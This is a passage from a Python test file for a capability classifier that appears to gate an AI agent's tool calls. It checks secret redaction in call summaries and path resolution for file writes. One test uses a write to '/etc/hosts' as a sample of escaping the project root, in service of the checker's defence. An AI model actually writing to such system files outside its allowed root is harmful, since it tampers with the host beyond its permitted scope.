        assert capability.kind is ActionKind.OPAQUE
        assert not capability.bounded

    def test_an_external_call_is_named_by_its_keys_and_never_its_values(self):
        capability = capability_of(
            "external_notion_create_page", {"token": "hunter2", "title": "x"}, root=ROOT
        )
        assert "hunter2" not in capability.summary
        assert "token" in capability.summary

    def test_a_file_write_is_its_resolved_target(self):
        capability = capability_of("files_write_file", {"path": "src/a.py"}, root=ROOT)
        assert capability.writes == ("src/a.py",)
        assert capability.escapes == ()
        assert capability_of("files_write_file", {"path": "/etc/hosts"}, root=ROOT).escapes
